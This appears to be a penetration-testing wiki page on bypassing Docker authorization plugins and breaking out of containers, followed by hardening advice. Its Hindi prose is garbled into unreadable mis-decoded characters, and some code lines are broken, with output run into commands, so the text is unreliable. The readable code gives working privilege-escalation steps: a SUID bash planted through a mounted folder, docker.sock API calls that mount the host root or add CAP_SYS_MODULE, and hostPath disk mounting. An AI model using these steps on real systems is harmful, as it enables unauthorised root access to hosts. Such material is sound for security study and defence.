рдХреБрдЫ рдореМрдХреЛрдВ рдкрд░, рд╕рд┐рд╕рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рдмрд┐рдирд╛ рдирд┐рдореНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбреЙрдХрд░ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдбреЙрдХрд░ рдореЗрдВ рдХреБрдЫ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## disallowed `run --privileged`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡реЙрд▓реНрдпреВрдореНрд╕ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░реНрд╕ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА** рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХреЛрдИ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рджреА:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реЗрд▓ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
рдЕрдм, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред

## рдорд╛рдЙрдВрдЯ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлреЛрд▓реНрдбрд░

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА** рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХреЛрдИ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рджреА, рдФрд░ рдЙрд╕рдиреЗ рдХреЗрд╡рд▓ `/tmp` рдлреЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢рд╛рдпрдж рдЖрдк `/tmp` рдлреЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк **рдЕрд▓рдЧ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлреЛрд▓реНрдбрд░** рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдХрдорд╛рдВрдб рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `find / -writable -type d 2>/dev/null`

**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрди рдХреА рд╕рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреА рд╣реИрдВ!** suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `mount | grep -v "nosuid"` рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдБред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдорддреМрд░ рдкрд░ `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` рдФрд░ `/var/lib/lxcfs` suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдЧрд░ рдЖрдк **`/etc` рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рдлреЛрд▓реНрдбрд░ **рдЬрд┐рд╕рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рд╣реЛрд╕реНрдЯ рдореЗрдВ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХреЗрдВ (рд╢рд╛рдпрдж `/etc/shadow` рдореЗрдВ рдмрджрд▓рд╛рд╡ рдХрд░рдХреЗ)
{% endhint %}

## Unchecked JSON Structure

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЬрдм рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ рдбреЙрдХрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдерд╛ рддреЛ рдЙрд╕рдиреЗ API рдХреЗ рдХрд┐рд╕реА **рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ рднреВрд▓ рдЧрдпрд╛ рд╣реЛ ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) рдЬреИрд╕реЗ рдХрд┐ "**Binds**".\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдирд╛ рдФрд░ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ рдХреЗ рд░реВрдЯ (/) рдлреЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИ:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## рдЕрдирдЪреЗрдХреНрдб JSON рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЬрдм рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ рдбреЙрдХрд░ рдлрд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рддреЛ рдЙрд╕рдиреЗ API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) рдХреЗ рдХрд┐рд╕реА рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЛ **рднреВрд▓ рдЧрдпрд╛** рдЬреИрд╕реЗ рдХрд┐ "**Capabilities**" рдЬреЛ рдХрд┐ "**HostConfig**" рдХреЗ рдЕрдВрджрд░ рд╣реЛрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдЗрд╕ рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **SYS_MODULE** рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рдорд╛рдЙрдВрдЯ

([**рдпрд╣рд╛рдБ**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d) рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА) рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рд╣рдорд▓рд╛рд╡рд░ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╣реЛрд╕реНрдЯ OS рддрдХ рдФрд░ рдЕрдзрд┐рдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХреНрд▓рд╕реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИред рдиреАрдЪреЗ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛рд╡рд░ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХреЗрдВ:
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# рдХрдВрдЯреЗрдирд░ рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реБрдзрд╛рд░

## Docker рдореЗрдВ Seccomp

рдпрд╣ Docker рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рддрдХрдиреАрдХ рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Docker рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЛ Docker рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker рдореЗрдВ AppArmor

рдпрд╣ Docker рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рддрдХрдиреАрдХ рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Docker рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЛ Docker рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ & AuthN

рдПрдХ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд▓рдЧрдЗрди Docker **daemon** рдХреЛ **requests** рдХреЛ **approve** рдпрд╛ **deny** рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╡рд░реНрддрдорд╛рди **authentication** рд╕рдВрджрд░реНрдн рдФрд░ **command** рд╕рдВрджрд░реНрдн рджреЛрдиреЛрдВ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИред **authentication** рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рднреА **user details** рдФрд░ **authentication** **method** рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред **command context** рдореЗрдВ рд╕рднреА **relevant** **request** рдбреЗрдЯрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред

{% content-ref url="broken-reference" %}
[рдЯреВрдЯреА рд╣реБрдИ рд▓рд┐рдВрдХ](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд░реНрдиреЗрд▓ рд╣реИ, рдЬреЛ Go рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рд╕рддрд╣ рдХрд╛ рдПрдХ рдмрдбрд╝рд╛ рд╣рд┐рд╕реНрд╕рд╛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ [Open Container Initiative (OCI)](https://www.opencontainers.org) рд░рдирдЯрд╛рдЗрдо `runsc` рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╣реЛрд╕реНрдЯ рдХрд░реНрдиреЗрд▓ рдХреЗ рдмреАрдЪ рдПрдХ **isolation boundary** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред `runsc` рд░рдирдЯрд╛рдЗрдо Docker рдФрд░ Kubernetes рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рдХрдВрдЯреЗрдирд░реНрд╕ рдЪрд▓рд╛рдирд╛ рд╕рд░рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рд╕рдореБрджрд╛рдп рд╣реИ рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣рд▓реНрдХреЗ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЗрдВ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреА рддрд░рд╣ рдорд╣рд╕реВрд╕ рдФрд░ рдкреНрд░рджрд░реНрд╢рди рдХрд░рддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬреЗрд╢рди рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд╕рд░реА рдкрд░рдд рдХреЗ рд░реВрдк рдореЗрдВ **stronger workload isolation** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред

{% embed url="https://katacontainers.io/" %}

## рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

Docker рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдФрд░ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЗ рдкреИрджрд╛ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рднрд▓реЗ рд╣реА `--privileged` рдлреНрд▓реИрдЧ рдХреА рдкреВрд░реА рд╢рдХреНрддрд┐ рдХреЗ рдмрд┐рдирд╛ред рдкреНрд░рддреНрдпреЗрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдФрд░ рдХреБрд▓ рдорд┐рд▓рд╛рдХрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдиреНрдпреВрдирддрдо рдЖрд╡рд╢реНрдпрдХрддрд╛ рддрдХ рд╕реАрдорд┐рдд рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП:

* `--privileged` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ [Docker socket рдХреЛ рдорд╛рдЙрдВрдЯ](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/) рди рдХрд░реЗрдВред Docker socket рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕реНрдкреЙрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╣реЛрд╕реНрдЯ рдХрд╛ рдкреВрд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд▓реЗрдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдХрд░ред
* рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рди рдЪрд▓рд╛рдПрдВред [рдЕрд▓рдЧ рдпреВрдЬрд░](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдпрд╛ [user namespaces](https://docs.docker.com/engine/security/userns-remap/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░реВрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рд╡рд╣реА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдЙрд╕реЗ user namespaces рдХреЗ рд╕рд╛рде рд░реАрдореИрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд▓рд┐рдирдХреНрд╕ namespaces, capabilities, рдФрд░ cgroups рджреНрд╡рд╛рд░рд╛ рд╣рд▓реНрдХреЗ рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИред
* [рд╕рднреА capabilities рдХреЛ рдбреНрд░реЙрдк рдХрд░реЗрдВ](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) рдФрд░ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реЗрдВ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ (`--cap-add=...`). рдХрдИ workloads рдХреЛ рдХрд┐рд╕реА рднреА capabilities рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╣рдорд▓реЗ рдХреА рдЧреБрдВрдЬрд╛рдЗрд╢ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред
* [тАЬno-new-privilegesтАЭ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рди рдХрд░ рд╕рдХреЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП suid binaries рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред
* [рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)ред рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛рдПрдВ рдорд╢реАрди рдХреЛ рд╕реЗрд╡рд╛ рд╕реЗ рдЗрдирдХрд╛рд░ рд╣рдорд▓реЛрдВ рд╕реЗ рдмрдЪрд╛ рд╕рдХрддреА рд╣реИрдВред
* [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (рдпрд╛ SELinux) рдкреНрд░реЛрдлрд╛рдЗрд▓реНрд╕ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ syscalls рдХреЛ рдиреНрдпреВрдирддрдо рдЖрд╡рд╢реНрдпрдХрддрд╛ рддрдХ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* [рдЖрдзрд┐рдХрд╛рд░рд┐рдХ docker images](https://docs.docker.com/docker-hub/official_images/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдпрд╛ рдЙрдирдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдкрдиреА рдЦреБрдж рдХреА рдмрдирд╛рдПрдВред [backdoored](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) images рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рди рд▓реЗрдВ рдпрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред
* рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдиреА images рдХреЛ рдкреБрдирдГ рдмрдирд╛рдПрдВ рддрд╛рдХрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдЪ рд▓рд╛рдЧреВ рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВред рдпрд╣ рдмрд┐рдирд╛ рдХрд╣реЗ рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИред

# рд╕рдВрджрд░реНрдн

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
